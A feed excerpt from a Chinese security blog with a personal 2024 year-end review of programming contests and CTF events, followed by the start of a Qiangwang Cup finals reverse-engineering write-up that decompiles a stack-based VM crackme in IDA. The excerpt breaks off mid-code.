href="http://www.qfrost.com/posts/windowskernel/windows%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_1">http://www.qfrost.com/posts/windowskernel/windows系统调用学习笔记_1</a></li></ul>]]></content>
    
    
    <summary type="html">来学习一下windows的系统调用</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="系统调用" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>2024年终总结</title>
    <link href="https://xia0ji233.github.io/2024/12/31/Summary2024/"/>
    <id>https://xia0ji233.github.io/2024/12/31/Summary2024/</id>
    <published>2024-12-31T11:00:00.000Z</published>
    <updated>2025-01-16T12:48:06.080Z</updated>
    
    <content type="html"><![CDATA[<p>2024年也快过去了，过去的目标完成了多少，现在又如何呢？</p><span id="more"></span><h2 id="2024总结"><a href="#2024总结" class="headerlink" title="2024总结"></a>2024总结</h2><div class="timeline  green"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2024 </p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-05</p></div></div><div class='timeline-item-content'><ul><li>在队内师傅的带领下，开始写 LLVM 的插件，持续开发到六月份，也算给自己计算机生涯积累了一个大的项目开发经验。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-14</p></div></div><div class='timeline-item-content'><ul><li>时隔两年，再次走上 EC Finals 的舞台，感谢老师们坚持不懈的努力拿到了来之不易的一个名额，最后遗憾打铁，但是这趟上海之行依然很开心。</li></ul><p>附一段当时写的半退役感言：</p><blockquote><p>人生中最后一场以大学生身份参加的EC finals还是没能以一个较好的结局结束，不过也收获了一次较好的回忆吧。</p><p>时间线拉回到六年之前，那时的我也只不过是一个再平凡不过的高一学生，没有同龄人那样出众的智慧，所幸一次偶然的机会让我接触到了算法竞赛（感谢我高中的信息技术老师），这便一下吸引了我，在老师的帮助下，我得以今入隔壁强校进行旁听。但是也隐约感觉到这条路以我现有的能力举步维艰，最后没能打进去也是也是因为自己客观上能力不够，主观上对待还是不够认真，没能得到一个很好的结果。但是从此这也在我心中种下一个种子，我很庆幸，在迷迷茫茫的高中找准了自己的方向，高考填报志愿时，也是80个志愿直接梭哈计算机。</p><p>进入大学之后，也是非常想弥补高中时留下的遗憾，选择坚持了两年的ACM，第一年省赛，铜。但是与此同时，上了大学之后的信息差也是非常明显的，我们有将近一年半的时间甚至不知道ccpc，icpc等比赛，这里也感谢杭电的朋友们，让Jiaxing University第一次出现在了icpc的舞台上并拿到铜牌。往后也是因为自己一直不能够一直专注，基本上也都是打铁而归吧，诚然，ctf是兴趣驱动，算竞经过大一一年之后的洗礼之后已然从兴趣变成了一种执念了。虽然是一个不算很完美的结果，但是这打算竞一段段美好的回忆也足够深刻。</p></blockquote></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>02-26</p></div></div><div class='timeline-item-content'><ul><li>得知自己的考研成绩，与SUS无缘，遂开始扔简历找实习，基本碰壁，最后靠队里师傅收留，找到一个实习的机会，持续实习了半个月，后道心破碎，想着4月走调剂吧，毕竟国家线稳过的。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>03-29</p></div></div><div class='timeline-item-content'><ul><li>西湖论剑进入决赛，感谢朋友们看到抄送我的邮件（因为忘了是填了outlook邮箱），最后一天卡着点交上了报名信息。</li></ul><img src="/2024/12/31/Summary2024/1.png" class=""><p>面基了很多师傅，也在杭州的午夜进行了一次多人city walk。</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>04-15</p></div></div><div class='timeline-item-content'><ul><li>ZJCPC 差点银牌，最后还是差点罚时拿铜牌了，只能说对得起队友和自己四年在XCPC上的努力了。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>04-16</p></div></div><div class='timeline-item-content'><ul><li>山科大的调剂发了复试通知，选接受并最后拟录取了，当时的我身心俱疲，想着就这样吧。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>09-30</p></div></div><div class='timeline-item-content'><ul><li>研究生的课程和本科生的课程没什么太大的区别，便想着自己找事情做了，经过导师的同意直接出去投实习。在知道我最想去的一个岗位有hc之后，便开始认真学习相关内容了，一直到今天跨年的时候，仍对相关知识保持高强度的学习&amp;实践。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-14</p></div></div><div class='timeline-item-content'><ul><li>华为研究生网安比赛两天的线下游，拿了保底三等奖，最关键是肃清了研究生生涯中的一些主要矛盾和次要矛盾，也聊了很多，走了很多地方去玩，也是非常开心，华为之夜还抽中了耳机。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>12-05</p></div></div><div class='timeline-item-content'><ul><li>和Nepnep战队一起参加的强网杯，虽然能做的尽力做了，但是一想到就差几分就能拿二等奖依旧有点难过，想着如果再努力一点会不会能把 RW 的那题做出来。赛后，也是心有不甘，和队里师傅商量积极完成了赛题的复现，趁此学习了一波，希望明年不会再留这个遗憾了。</li></ul></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>12-31</p></div></div><div class='timeline-item-content'><ul><li>也就是今天吧，“玩”了很久的二次元开放世界冒险游戏，希望明年能好好“玩”。</li><li>为了这个，也是尽量学习了自己以前望而生畏的工具，去细细研究之后才发现其实没有那么可怕，甚至深入进去之后觉得就需要一个这样的工具，我想这应该就是所谓的，“曾经我看山是山，看水是水，后来我看山不是山，看水不是水，再后来我看山还是山，看水还是水”，我的认知也随着这一次次否定之否定在慢慢地螺旋上升吧。</li></ul></div></div></div><p>2024总结就是，遗憾是多的，前路也是明亮的，新的一年，仍需朝着自己的目标，努力学习。</p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>往年的年终总结是有目标的，但是鉴于自己 p 人的性格，还是不写了，明确大体方向就 OK。希望新的一年，变得更加优秀，朝着更好的方向，稳步前进。</p>]]></content>
    
    
    <summary type="html">2024年终总结</summary>
    
    
    
    <category term="随笔" scheme="https://xia0ji233.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    <category term="年终总结" scheme="https://xia0ji233.github.io/categories/%E9%9A%8F%E7%AC%94/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
    
  </entry>
  
  <entry>
    <title>强网杯S8决赛Reverse writeup</title>
    <link href="https://xia0ji233.github.io/2024/12/11/qwb2024_final_reverse/"/>
    <id>https://xia0ji233.github.io/2024/12/11/qwb2024_final_reverse/</id>
    <published>2024-12-11T05:00:00.000Z</published>
    <updated>2025-01-16T12:46:13.277Z</updated>
    
    <content type="html"><![CDATA[<p>复盘一下强网决赛的Reverse题。</p><span id="more"></span><h2 id="S1mpleVM"><a href="#S1mpleVM" class="headerlink" title="S1mpleVM"></a>S1mpleVM</h2><p><a href="S1mpLeVM_6d429db3ceeba8f95131c477020ee899.zip">附件下载</a></p><p>题目名字已经很明显的告诉你了，就是 vm 逆向。</p><h3 id="基本分析"><a href="#基本分析" class="headerlink" title="基本分析"></a>基本分析</h3><p>入口其实没啥，就是输入 32 长度的 passcode 然后校验，启动方式是 <code>./secret_box.exe quest</code> 命令行传参。</p><p>可以找到最关键的函数 <code>sub_140001D30</code> 就是 VM 入口。</p><img src="/2024/12/11/qwb2024_final_reverse/1.png" class=""><p>这个函数里面很明显的 vm_handler</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vmrun</span><span class="params">(<span class="type">char</span> *input, <span class="type">char</span> *vmcode)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//some defs for local variable</span></span><br><span class="line">  v2 = <span class="number">0LL</span>;</span><br><span class="line">  v3 = *vmcode - <span class="number">16</span>;</span><br><span class="line">  v5 = v48;</span><br><span class="line">  v6 = vmcode + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v9 = v2;</span><br><span class="line">          v2 = (<span class="type">signed</span> <span class="type">int</span> *)*((_QWORD *)v2 + <span class="number">1</span>);</span><br><span class="line">          v7 = *v9;</span><br><span class="line">          <span class="built_in">free</span>(v9);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = v2;</span><br><span class="line">            v2 = (<span class="type">signed</span> <span class="type">int</span> *)*((_QWORD *)v2 + <span class="number">1</span>);</span><br><span class="line">            v8 = *v10;</span><br><span class="line">            <span class="built_in">free</span>(v10);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v8 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = <span class="number">0x80000000</span>;</span><br><span class="line">          v8 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v11 = (<span class="type">signed</span> <span class="type">int</span> *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        *v11 = v7 % v8;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">LABEL_53:</span><br><span class="line">      *((_QWORD *)v11 + <span class="number">1</span>) = v2;</span><br><span class="line">      v2 = v11;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难发现，v3 是所谓的 opcode，v6 是 PC 指针，并且 vmcode 是实际的字节码 <code>- 0x10</code>，下面来一个个分析这些 vm 的指令。</p><p>首先是 0 号指令，做了一个较为复杂的指针操作。这里初看可能啥也看不明白，但是可以发现最下面它分配了 0x10 的空间同时又 v7 和 v8 做模运算了赋值给 v11 指向的地址。</p><p>操作完成之后又执行了 <code>*((_QWORD *)v11 + 1) = v2;</code> 和 <code>v2 = v11;</code>，如此种种的迹象显然不难让人联想到一种结构：链表。如果将划分的 0x10 字节内存进行划分，也可以看出，前八个字节存储数据，后八个字节存储指针。</p><p><code>shift+F1</code> 打开 IDA 的 <code>local type</code> 窗口，按 <code>insert</code> 键插入结构体的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LinkEntry</span>&#123;</span></span><br><span class="line">    <span class="type">signed</span> val;</span><br><span class="line">    LinkEntry * next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 v11 和 v2 定义修改之后，IDA 将展示如下的伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line"><span class="keyword">if</span> ( v2 )</span><br><span class="line">&#123;</span><br><span class="line">    v9 = &amp;v2-&gt;val;</span><br><span class="line">    v2 = v2-&gt;next;</span><br><span class="line">    v7 = *v9;</span><br><span class="line">    <span class="built_in">free</span>(v9);</span><br><span class="line">    <span class="keyword">if</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">        v10 = &amp;v2-&gt;val;</span><br><span class="line">        v2 = v2-&gt;next;</span><br><span class="line">        v8 = *v10;</span><br><span class="line">        <span class="built_in">free</span>(v10);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        v8 = <span class="number">0x80000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    v7 = <span class="number">0x80000000</span>;</span><br><span class="line">    v8 = <span class="number">0x80000000</span>;</span><br><span class="line">&#125;</span><br><span class="line">v11 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">v11-&gt;val = v7 % v8;</span><br><span class="line"><span class="keyword">goto</span> LABEL_53;</span><br></pre></td></tr></table></figure><p>可以说，基本上是一目了然了，并且据此可以联想到一个栈的结果，将两个数 push 进栈中，再弹出来做计算，计算的结果重新入栈。</p><p>这里可以将所有 malloc 返回值接收的变量都改成 <code>LinkEntry *</code> 类型。</p><p>此时再来观察整个反编译的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vmrun</span><span class="params">(<span class="type">char</span> *input, <span class="type">char</span> *vmcode)</span></span><br><span class="line">&#123;</span><br><span class="line">  LinkEntry *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> opcode; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// r14d</span></span><br><span class="line">  <span class="type">char</span> *PC; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v8; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> *v9; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> *v10; <span class="comment">// rcx</span></span><br><span class="line">  LinkEntry *v11; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// ebx</span></span><br><span class="line">  LinkEntry *v13; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v14; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v15; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v16; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v17; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v18; <span class="comment">// rcx</span></span><br><span class="line">  LinkEntry *v19; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v20; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v21; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v22; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v23; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// ebx</span></span><br><span class="line">  LinkEntry *v26; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> *v29; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> *v30; <span class="comment">// rcx</span></span><br><span class="line">  LinkEntry *v31; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v32; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v33; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v34; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v35; <span class="comment">// rcx</span></span><br><span class="line">  LinkEntry *v36; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v37; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v38; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v39; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v40; <span class="comment">// rcx</span></span><br><span class="line">  LinkEntry *v41; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v42; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v43; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> *v44; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> *v45; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v46; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v48; <span class="comment">// [rsp+58h] [rbp+10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0LL</span>;</span><br><span class="line">  opcode = *vmcode - <span class="number">16</span>;</span><br><span class="line">  v5 = v48;</span><br><span class="line">  PC = vmcode + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( opcode )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v9 = &amp;v2-&gt;val;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v7 = *v9;</span><br><span class="line">          <span class="built_in">free</span>(v9);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = &amp;v2-&gt;val;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v8 = *v10;</span><br><span class="line">            <span class="built_in">free</span>(v10);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v8 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = <span class="number">0x80000000</span>;</span><br><span class="line">          v8 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v11 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v11-&gt;val = v7 % v8;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        v12 = *PC;</span><br><span class="line">        v13 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        ++PC;</span><br><span class="line">        v13-&gt;next = v2;</span><br><span class="line">        v2 = v13;</span><br><span class="line">        v13-&gt;val = v12;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v14 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v5 = *v14;</span><br><span class="line">          <span class="built_in">free</span>(v14);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v5 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v17 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v15 = *v17;</span><br><span class="line">          <span class="built_in">free</span>(v17);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v18 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v16 = *v18;</span><br><span class="line">            <span class="built_in">free</span>(v18);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v16 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v15 = <span class="number">0x80000000</span>;</span><br><span class="line">          v16 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">   